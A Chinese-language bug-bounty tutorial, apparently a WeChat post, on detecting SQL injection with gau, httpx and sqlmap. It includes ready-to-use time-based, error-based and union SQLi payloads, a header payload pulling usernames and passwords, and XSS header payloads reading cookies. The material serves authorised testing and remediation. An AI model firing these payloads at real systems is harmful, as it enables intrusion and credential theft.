#  【SRC】SQL 注入（SQLi）漏洞检测指南   
 独眼情报   2024-12-29 11:16  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnR75ibk6vb87QRDqcZOI1m5xCibdXiaxs1N2ufsyFGhHqCppOiaRwlvDpRveHpqMajfvHy0aAHYcTS5uA/640?wx_fmt=png&from=appmsg "")  
## SQL 注入（SQLi）漏洞检测指南  
  
SQL 注入漏洞仍然是 web 应用程序中的一个重要安全问题。本指南将详细介绍如何识别、测试和记录 SQLi 漏洞，并强调授权测试的安全研究实践。  
### 前提条件  
  
在开始任何安全测试之前，请确保您已经：  
- 获得了测试目标系统的书面授权  
  
- 使用受控的测试环境或明确的权限  
  
- 理解 web 安全基础和 SQL  
  
- 熟悉命令行工具  
  
- 了解负责任的信息披露实践  
  
## 了解 SQL 注入  
  
SQL 注入发生在应用程序未能正确验证或清理用于数据库查询的用户输入时。这可能允许攻击者修改或操纵预期的 SQL 查询，从而可能导致未经授权的数据访问或操纵。  
### 常见的 SQLi 类型：  
1. 基于错误的 SQLi  
  
1. 基于联合的 SQLi  
  
1. 布尔盲注 SQLi  
  
1. 时间盲注 SQLi  
  
1. 带外 SQLi  
  
## 设置测试环境  
### 工具安装  
```
# 安装 GetAllUrls (GAU)
go install github.com/lc/gau/v2/cmd/gau@latest

# 安装 URL 优化器 (URO)
go install github.com/s0md3v/uro@latest


# 安装 HTTP 工具包 (HTTPX)
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

# 安装 SQLMap（Debian/Ubuntu）
sudo apt install sqlmap

# 适用于 Mac 用户（使用 Homebrew）
brew install sqlmap

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnR75ibk6vb87QRDqcZOI1m5xc8Z8fT8Os9ByVZQiaqrxwp10ahLfsQgfz5UccsI86bXCBSoeMmY4laQ/640?wx_fmt=png&from=appmsg "")  
  
Gau工具效果  
## 检测过程  
### 第一步：全面参数发现  
  
用于发现潜在注入点的初始命令链：  
```
echo "http://target.example.com/" | gau | uro | grep "\?" | sed "s/=.*$/=A\'/" | uniq > params.txt
cat params.txt | httpx -mr ".*SQL.*|.*syntax.*|.*error.*"

```  
### 命令分解：  
1. echo "http://target.example.com/"：设置目标 URL  
  
1. gau：从以下位置获取 URL：  
  
1. Wayback Machine  
  
1. Common Crawl  
  
1. AlienVault OTX  
  
1. URLScan  
  
1. uro：优化 URL，包括：  
  
1. 去重  
  
1. 规范化路径  
  
1. 清理参数  
  
1. grep "\?"：提取包含查询参数的 URL  
  
1. sed "s/=.*$/=A\'/"：将参数值替换为 SQL 注入测试负载  
  
1. httpx：探测端点，寻找 SQL 错误模式  
  
### 第二步：高级 SQLMap 使用  
  
全面的 SQLMap 测试命令及其解释：  
```
sqlmap -u "http://target.example.com/page?param=value" \
  -p param \
  --dbms=MSSQL \
  --level 1 \
  --risk 1 \
  --banner \
  --current-user \
  --current-db \
  --is-dba \
  --threads 10 \
  --batch \
  --random-agent

```  
### 参数解释：  
- -u：目标 URL  
  
- -p：要测试的参数  
  
- --dbms：目标数据库类型  
  
- --level：测试深度（1-5）  
  
- --risk：负载风险（1-3）  
  
- --banner：检索数据库横幅  
  
- --current-user：获取当前数据库用户  
  
- --current-db：获取当前数据库名称  
  
- --is-dba：检查当前用户是否为管理员  
  
- --threads：并发线程数  
  
- --batch：从不请求用户输入  
  
- --random-agent：使用随机 User-Agent  
  
### 第三步：全面的头部测试  
### SQLi 测试头部  
```
X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
Referer: https://example.com/'+(select*from(select(sleep(10)))a)+' 
Cookie: 'XOR(if(now()=sysdate(),sleep(10),0))XOR'
User-Agent: "XOR(if(now()=sysdate(),sleep(10),0))XOR"

```  
### XSS 测试头部  
```
X-Forwarded-Host: evil.com"\><img src=onerror=prompt(document.cookie)>
X-Forwarded-For: "\><script>alert(document.domain)</script>
Referer: "\><img src=x onerror=alert(1)>
User-Agent: "\><svg/onload=alert(1)>

```  
### 使用 cURL 进行测试  
```
# 基本 SQLi 测试
curl -X GET "http://target.example.com" \
  -H "X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Cookie: session=test" \
  -v

# 基于时间的测试
curl -X GET "http://target.example.com" \
  -H "X-Forwarded-For: '+(select*from(select(sleep(10)))a)+'" \
  -v

# 基于错误的测试
curl -X GET "http://target.example.com" \
  -H "Cookie: '+(select/\*!50000convert\*/(/\*!50000select\*/concat(username,0x3a,password)/\*!50000from\*/users/\*!50000where\*/id=1)+'" \
  -v

```  
## 记录和报告  
### 必要的记录元素  
1. **漏洞详情**  
  
1. 发现的 SQLi 类型  
  
1. 受影响的参数/头部  
  
1. 数据库类型和版本  
  
1. 认证要求  
  
1. **概念证明**  
  
1. 完整的 HTTP 请求  
  
1. 使用的负载  
  
1. 可观察的响应  
  
1. 复现步骤  
  
1. **影响评估**  
  
1. 潜在数据泄露  
  
1. 系统访问级别  
  
1. 业务影响  
  
1. 风险评级  
  
1. **修复建议**  
  
1. 输入验证  
  
1. 参数化查询  
  
1. 正确的错误处理  
  
1. 最小权限原则  
  
### 安全研究的最佳实践  
### 测试指南  
1. 从低风险测试开始  
  
1. 监控系统响应  
  
1. 完整记录  
  
1. 负责任地使用自动化工具  
  
1. 手动验证发现  
  
1. 遵守测试边界  
  
### 道德考虑  
1. 不要超过授权范围  
  
1. 保护发现的数据  
  
1. 及时报告发现  
  
1. 遵循负责任的信息披露  
  
1. 保密  
  
1. 保持通讯以便和SRC审核沟通具体问题  
  
### 高级技术  
### 基于错误的 SQLi  
```
' AND 1=convert(int,(SELECT @@version))--
' AND 1=convert(int,(SELECT table_name FROM information_schema.tables))--' AND 1=convert(int,(SELECT column_name FROM information_schema.columns))--

```  
### 基于时间的 SQLi  
```
';WAITFOR DELAY '0:0:10'--
';IF(1=1) WAITFOR DELAY '0:0:10'--
' OR IF(1=1,SLEEP(10),'false')--

```  
### 基于联合的 SQLi  
```
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--' UNION SELECT @@version,null,null--

```  
### 工具和资源  
### 额外的测试工具  
- Burp Suite Professional  
  
- OWASP ZAP  
  
- Acunetix  
  
- Netsparker  
  
- Nuclei  
  
### 学习资源  
1. OWASP SQL 注入预防速查表  
  
1. PortSwigger 的 Web 安全学院  
  
1. HackerOne CTF 挑战  
  
1. PentesterLab SQL 注入练习  
  
1. DVWA（非常易受攻击的 Web 应用程序）  
  
## 结论  
  
SQL 注入测试仍然是 Web 应用程序安全领域的一项关键技能。本全面指南为进行彻底、负责任的安全测试提供了基础。请记住，最终目标是提高安全态势并保护系统和数据。  
### 关键要点  
1. 始终获得适当的授权  
  
1. 完整记录  
  
1. 系统化测试  
  
1. 负责任地报告  
  
1. 持续学习  
  
**注意：** 本文专为教育和授权安全测试目的而设计。进行安全测试时，始终获得适当的权限并遵守适用的法律法规。  
  
  
